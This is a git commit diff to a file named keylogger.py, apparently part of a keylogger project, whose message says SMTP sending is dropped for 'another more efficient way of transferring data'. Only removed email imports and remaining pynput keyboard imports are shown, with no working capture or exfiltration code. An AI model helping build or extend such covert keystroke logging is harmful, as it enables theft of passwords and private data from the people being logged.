45918b588e808d9382b661f553499eac6269542c
jeflecias <jefleciasg@gmail.com>
2025-01-27 20:11:24 +0800

    removed smtp, going to use another more efficient way of transferring data

--- keylogger.py
+++ keylogger.py
@@ -1,8 +1,3 @@
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
 from pynput import keyboard
 import datetime
 
